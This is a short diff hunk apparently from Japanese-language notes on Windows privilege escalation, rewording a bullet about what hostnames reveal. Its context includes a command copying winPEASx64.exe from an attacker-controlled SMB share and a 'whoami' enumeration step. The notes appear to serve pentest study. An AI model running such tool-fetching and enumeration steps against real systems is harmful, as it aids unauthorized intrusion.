@@ -81,8 +81,7 @@ cp \\<AttackerIP>\share\winPEASx64.exe .
 ```cmd
 whoami
 ```
-- ホスト名：そのマシンの役割や種別を示すことが多い
-	-
+- ホスト名はそのマシンの役割や種別を示すことが多い
 
 現在のユーザーが所属するグループ
 ```powershell
